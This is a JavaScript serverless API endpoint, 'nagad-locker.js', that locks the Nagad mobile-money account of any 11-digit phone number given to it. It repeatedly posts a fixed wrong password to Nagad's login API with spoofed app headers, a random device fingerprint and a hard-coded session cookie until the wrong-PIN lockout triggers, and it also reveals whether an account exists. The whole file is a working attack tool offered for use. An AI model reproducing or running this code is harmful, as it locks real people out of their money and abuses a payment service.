// File: /api/nagad-locker.js

export default async function handler(req, res) {
    const phone = req.query.phone;

    if (!phone) {
        return res.status(400).json({
            status: "Error",
            message: "Phone number required via GET parameter 'phone'",
            credit: "Tofazzal Hossain"
        });
    }

    if (!/^\d{11}$/.test(phone)) {
        return res.status(400).json({
            status: "Error",
            message: "Invalid phone number format (use 11 digits, e.g., 01811917222)",
            credit: "Tofazzal Hossain"
        });
    }

    const result = await probeNagadAPI(phone);
    res.status(200).json(result);
}

function generateDeviceFGP() {
    return [...Array(64)].map(() => Math.floor(Math.random() * 16).toString(16)).join('').toUpperCase();
}

async function probeNagadAPI(phone, attempt = 1, maxAttempts = 10) {
    const fetch = (await import('node-fetch')).default;

    const url = "https://app2.mynagad.com:20002/api/login";
    const payload = {
        aspId: "100012345612345",
        mpaId: null,
        password: "a20a2b7bb0842d5cf8a0c06c62",
        username: phone
    };

    const headers = {
        "Host": "app2.mynagad.com:20002",
        "User-Agent": "okhttp/3.14.9",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json; charset=UTF-8",
        "X-KM-UserId": "90617201",
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1170",
        "X-KM-DEVICE-FGP": generateDeviceFGP(),
        "X-KM-Accept-language": "bn",
        "X-KM-AppCode": "01",
        "Cookie": "TS01e66e4e=01e006cfdc349eb3eecc47575b1a86adf7abce15ffec34d8e3c94f2003e99d1b98fdd527a63216d2af3001d251e96d12051ba132b017bbf62af967b59a1003aa887a50769a"
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers,
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        const message = data?.message || '';

        if (attempt === 1) {
            if (message.includes("আপনার কোন নগদ অ্যাকাউন্ট নেই")) {
                return { status: "Invalid Nagad Number", credit: "Tofazzal Hossain" };
            }
            if (message.includes("একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে")) {
                return { status: "Already Locked", credit: "Tofazzal Hossain" };
            }
        }

        if (message.includes("পিন ভুল হয়েছে। সঠিক পিন লিখে আবার চেষ্টা করুন।") && attempt < maxAttempts) {
            return await probeNagadAPI(phone, attempt + 1, maxAttempts);
        }

        if (message.includes("একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে")) {
            return { status: "Locked Successful", credit: "Tofazzal Hossain" };
        }

        return { status: "Unknown", credit: "Tofazzal Hossain" };

    } catch (error) {
        return { status: "Error", message: "Request failed", credit: "Tofazzal Hossain" };
    }
}
